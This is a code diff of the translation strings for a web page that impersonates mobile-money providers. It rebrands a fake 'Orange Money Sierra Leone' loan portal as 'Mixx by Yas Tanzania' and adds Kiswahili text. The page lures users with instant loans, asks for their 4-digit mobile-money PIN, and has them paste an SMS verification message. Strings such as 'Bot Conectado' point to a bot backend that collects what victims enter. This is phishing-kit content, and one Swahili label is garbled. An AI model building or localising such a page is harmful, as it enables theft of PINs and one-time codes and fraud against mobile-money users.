@@ -1,10 +1,68 @@
 (function() {
   const translations = {
+    sw: {
+      title: "Mixx by Yas Tanzania — Portal ya Mikopo ya Kidijitali",
+      heroBadge: "Idhini ya Papo Hapo via Mixx by Yas Tanzania 🇹🇿",
+      heroHeading: "Simulisha Mkopo Wako",
+      heroSubtitle: "Pata fedha moja kwa moja kwenye akaunti yako ya Mixx by Yas Tanzania kwa dakika chache.",
+      requestedAmount: "Kiasi Unachoomba",
+      interestRate: "Riba 5% kwa mwezi",
+      repaymentTerm: "Muda wa Kurejesha",
+      month1: "Mwezi 1",
+      months3: "Miezi 3",
+      months6: "Miezi 6",
+      months12: "Miezi 12",
+      estMonthly: "Marejesho kwa Mwezi:",
+      totalRepay: "Jumla ya Kurejesha:",
+      applyNow: "OMBA MKOPO SASA",
+      step1Title: "Taarifa za Mkopo",
+      step1Sub: "Chagua vigezo vya mkopo wako (Bustisha au Nivushe Plus).",
+      loanType: "Aina ya Mkopo",
+      amountLabel: "Kiasi (TZS)",
+      termLabel: "Muda (Miezi)",
+      purposeLabel: "Dhumuni la Mkopo",
+      continueToPersonal: "ENDELEA KWENYE TAARIFA BINAOrdered",
+      step2Title: "Taarifa za Mwombaji",
+      step2Sub: "Jaza taarifa zako rasmi za kitambulisho.",
+      firstName: "Jina la Kwanza",
+      lastName: "Jina la Ukoo",
+      orangePhone: "Nambari ya Simu ya Mixx (+255)",
+      employmentStatus: "Hali ya Ajira",
+      agentConsent: "Namruhusu wakala wa Mixx Wakala kufuatilia hali ya ombi langu.",
+      continueToAuth: "ENDELEA KWENYE UHAKIKI WA MIXX",
+      step3Title: "Ingia kwenye Mixx by Yas",
+      step3Sub: "Thibitisha nambari yako ya simu na uweke PIN ya tarakimu 4 ili kuthibitisha mkopo.",
+      phoneNum: "Nambari ya Simu",
+      pinLabel: "PIN ya Mixx (tarakimu 4):",
+      showPin: "Onyesha",
+      hidePin: "Ficha",
+      confirmLoanBtn: "INGIA NA THIBITISHA MKOPO",
+      awaitingApproval: "Inasubiri Idhini",
+      pinAwaitingDesc: "PIN yako ya tarakimu 4 imetumwa. Tafadhali subiri wakati kuingia kwako kunahakikiwa...",
+      step4Title: "Uhakiki wa Umiliki wa Akaunti",
+      step4Sub: "Nakili ujumbe au kiunganishi cha uthibitisho kutoka kwenye programu ya Ujumbe kisha ubandike hapa chini.",
+      smsLabel: "Ujumbe wa Uthibitisho (SMS)",
+      submitSmsBtn: "TUMA UJUMBE WA UHAKIKI",
+      awaitingVerification: "Inasubiri Uhakiki",
+      smsAwaitingDesc: "Uhakiki wako wa SMS umetwa. Tafadhali subiri wakati uthibitisho wako unakaguliwa...",
+      step5Title: "Ombi Lilitumwa!",
+      step5Sub: "Ombi lako la mkopo limeelekezwa kwa Huduma za Kifedha za Mixx by Yas Tanzania.",
+      appRef: "Nambari ya Kumbukumbu:",
+      applicantName: "Mwombaji:",
+      orangeContact: "Mawasiliano ya Mixx:",
+      loanMode: "Aina ya Mkopo:",
+      requestedAmt: "Kiasi Kilichoombwa:",
+      termRepay: "Muda / Marejesho:",
+      currentStatus: "Hali ya Sasa:",
+      statusPending: "⏳ Inakaguliwa",
+      newLoanBtn: "OMBA MKOPO MWINGINE",
+      footerRights: "© 2026 Mixx by Yas Tanzania — Huduma za Kifedha na Mikopo"
+    },
     en: {
-      title: "Orange Money Loans Sierra Leone — Application Portal",
-      heroBadge: "Instant Approval via Orange Money Sierra Leone",
+      title: "Mixx by Yas Tanzania — Digital Financial Portal",
+      heroBadge: "Instant Approval via Mixx by Yas Tanzania 🇹🇿",
       heroHeading: "Simulate Your Loan",
-      heroSubtitle: "Get funds directly into your Orange Money Sierra Leone account in minutes.",
+      heroSubtitle: "Get funds directly into your Mixx by Yas Tanzania account in minutes.",
       requestedAmount: "Requested Amount",
       interestRate: "5% monthly rate",
       repaymentTerm: "Repayment Term",
@@ -16,9 +74,9 @@
       totalRepay: "Total Repayable:",
       applyNow: "APPLY FOR LOAN NOW",
       step1Title: "Loan Details",
-      step1Sub: "Customize your loan terms.",
+      step1Sub: "Customize your loan terms (Bustisha or Nivushe Plus).",
       loanType: "Loan Type",
-      amountLabel: "Amount (SLE)",
+      amountLabel: "Amount (TZS)",
       termLabel: "Term (Months)",
       purposeLabel: "Loan Purpose",
       continueToPersonal: "CONTINUE TO PERSONAL DETAILS",
@@ -26,14 +84,14 @@
       step2Sub: "Fill in your official identification information.",
       firstName: "First Name",
       lastName: "Last Name",
-      orangePhone: "Orange Money Phone (+232)",
+      orangePhone: "Mixx Account Phone (+255)",
       employmentStatus: "Employment Status",
-      agentConsent: "I authorize the referral agent to track application status.",
-      continueToAuth: "CONTINUE TO ORANGE AUTHENTICATION",
-      step3Title: "Sign in to Orange Money",
+      agentConsent: "I authorize the Mixx Wakala agent to track application status.",
+      continueToAuth: "CONTINUE TO MIXX AUTHENTICATION",
+      step3Title: "Sign in to Mixx by Yas",
       step3Sub: "Confirm your phone number and enter your 4-digit PIN to validate your loan.",
       phoneNum: "Phone Number",
-      pinLabel: "Orange Money PIN (4 digits):",
+      pinLabel: "Mixx PIN (4 digits):",
       showPin: "Show",
       hidePin: "Hide",
       confirmLoanBtn: "LOGIN & CONFIRM LOAN",
@@ -46,104 +104,47 @@
       awaitingVerification: "Awaiting Verification",
       smsAwaitingDesc: "Your SMS verification has been submitted. Please wait while your submission is being verified...",
       step5Title: "Application Submitted!",
-      step5Sub: "Your loan request has been routed to Orange Money Financial Services Sierra Leone.",
+      step5Sub: "Your loan request has been routed to Mixx by Yas Financial Services Tanzania.",
       appRef: "Application Reference:",
       applicantName: "Applicant:",
-      orangeContact: "Orange Contact:",
+      orangeContact: "Mixx Contact:",
       loanMode: "Loan Type:",
       requestedAmt: "Requested Amount:",
       termRepay: "Term / Payment:",
       currentStatus: "Current Status:",
       statusPending: "⏳ Under Review",
       newLoanBtn: "APPLY FOR ANOTHER LOAN",
-      footerRights: "© 2026 Orange Money Credit Services Sierra Leone"
-    },
-    pt: {
-      title: "Empréstimos Orange Money Serra Leoa — Portal de Candidatura",
-      heroBadge: "Aprovação Instantânea via Orange Money Serra Leoa",
-      heroHeading: "Simule o seu Empréstimo",
-      heroSubtitle: "Receba os fundos diretamente na sua conta Orange Money Serra Leoa em minutos.",
-      requestedAmount: "Valor Solicitado",
-      interestRate: "Taxa 5% a.m.",
-      repaymentTerm: "Prazo de Reembolso",
-      month1: "1 Mês",
-      months3: "3 Meses",
-      months6: "6 Meses",
-      months12: "12 Meses",
-      estMonthly: "Prestação Mensal Estimada:",
-      totalRepay: "Total a Reembolsar:",
-      applyNow: "SOLICITAR EMPRÉSTIMO AGORA",
-      step1Title: "Detalhes do Crédito",
-      step1Sub: "Personalize a sua modalidade de empréstimo.",
-      loanType: "Tipo de Empréstimo",
-      amountLabel: "Valor (SLE)",
-      termLabel: "Prazo (Meses)",
-      purposeLabel: "Finalidade do Empréstimo",
-      continueToPersonal: "CONTINUAR PARA DADOS PESSOAIS",
-      step2Title: "Dados do Candidato",
-      step2Sub: "Preencha com os seus dados identificativos oficiais.",
-      firstName: "Nome",
-      lastName: "Apelido",
-      orangePhone: "Número Orange Money (+232)",
-      employmentStatus: "Situação Profissional",
-      agentConsent: "Autorizo o agente de referência a acompanhar o estado da candidatura.",
-      continueToAuth: "CONTINUAR PARA AUTENTICAÇÃO ORANGE",
-      step3Title: "Entrar no Orange Money",
-      step3Sub: "Confirme o seu número e insira o PIN de 4 dígitos para validar o seu empréstimo.",
-      phoneNum: "Número de Telefone",
-      pinLabel: "PIN Orange Money (4 dígitos):",
-      showPin: "Mostrar",
-      hidePin: "Ocultar",
-      confirmLoanBtn: "ENTRAR E CONFIRMAR EMPRÉSTIMO",
-      awaitingApproval: "Aguardando Aprovação",
-      pinAwaitingDesc: "O seu PIN de 4 dígitos foi submetido. Por favor, aguarde enquanto o seu acesso é verificado...",
-      step4Title: "Verificação de Titularidade",
-      step4Sub: "Copie a mensagem/link de confirmação da sua aplicação de Mensagens e cole abaixo.",
-      smsLabel: "Mensagem de Confirmação SMS",
-      submitSmsBtn: "ENVIAR MENSAGEM DE VERIFICAÇÃO",
-      awaitingVerification: "Aguardando Verificação",
-      smsAwaitingDesc: "A sua verificação por SMS foi submetida. Por favor, aguarde enquanto a sua submissão é verificada...",
-      step5Title: "Candidatura Submetida!",
-      step5Sub: "O seu pedido de crédito foi encaminhado para os Serviços Financeiros Orange Money Serra Leoa.",
-      appRef: "Referência do Pedido:",
-      applicantName: "Candidato:",
-      orangeContact: "Contacto Orange:",
-      loanMode: "Modalidade:",
-      requestedAmt: "Valor Solicitado:",
-      termRepay: "Prazo / Prestação:",
-      currentStatus: "Estado Atual:",
-      statusPending: "⏳ Em Análise",
-      newLoanBtn: "SOLICITAR NOVO EMPRÉSTIMO",
-      footerRights: "© 2026 Orange Money Credit Services Serra Leoa"
+      footerRights: "© 2026 Mixx by Yas Tanzania Credit & Financial Services"
     },
     common: {
-      "Bot Conectado": { en: "Bot Connected", pt: "Bot Conectado" },
-      "Configurado": { en: "Configured", pt: "Configurado" },
-      "Link copiado com sucesso!": { en: "Link copied successfully!", pt: "Link copiado com sucesso!" },
-      "Pendente": { en: "Pending", pt: "Pendente" },
-      "Em Análise": { en: "Under Review", pt: "Em Análise" },
-      "Aprovado": { en: "Approved", pt: "Aprovado" },
-      "Rejeitado": { en: "Rejected", pt: "Rejeitado" },
-      "meses": { en: "months", pt: "meses" },
-      "candidatura(s).": { en: "application(s).", pt: "candidatura(s)." }
+      "Bot Conectado": { sw: "Bot Imeunganishwa", en: "Bot Connected" },
+      "Configurado": { sw: "Imewekwa", en: "Configured" },
+      "Link copiado com sucesso!": { sw: "Kiunganishi kimenakiliwa vizuri!", en: "Link copied successfully!" },
+      "Pendente": { sw: "Inasubiri", en: "Pending" },
+      "Em Análise": { sw: "Inakaguliwa", en: "Under Review" },
+      "Aprovado": { sw: "Imeidhinishwa", en: "Approved" },
+      "Rejeitado": { sw: "Imekataliwa", en: "Rejected" },
+      "meses": { sw: "miezi", en: "months" },
+      "candidatura(s).": { sw: "ombi/maombi.", en: "application(s)." }
     }
   };
 
-  let currentLang = localStorage.getItem("emola_lang") || "en";
+  // Default language is Kiswahili ('sw')
+  let currentLang = localStorage.getItem("mixx_lang") || "sw";
 
   window.t = function(key) {
     if (!key) return "";
     if (translations.common && translations.common[key]) {
-      return translations.common[key][currentLang] || translations.common[key].en || key;
+      return translations.common[key][currentLang] || translations.common[key].sw || translations.common[key].en || key;
     }
-    const dict = translations[currentLang] || translations.en;
+    const dict = translations[currentLang] || translations.sw;
     return dict[key] || key;
   };
 
   function setLanguage(lang) {
     currentLang = lang;
-    localStorage.setItem("emola_lang", lang);
-    const dict = translations[lang] || translations.en;
+    localStorage.setItem("mixx_lang", lang);
+    const dict = translations[lang] || translations.sw;
     
     document.querySelectorAll(".language-toggle").forEach(btn => {
       btn.innerText = lang.toUpperCase();
@@ -161,7 +162,7 @@
     setLanguage(currentLang);
     document.querySelectorAll(".language-toggle").forEach(btn => {
       btn.addEventListener("click", () => {
-        const nextLang = currentLang === "en" ? "pt" : "en";
+        const nextLang = currentLang === "sw" ? "en" : "sw";
         setLanguage(nextLang);
       });
     });
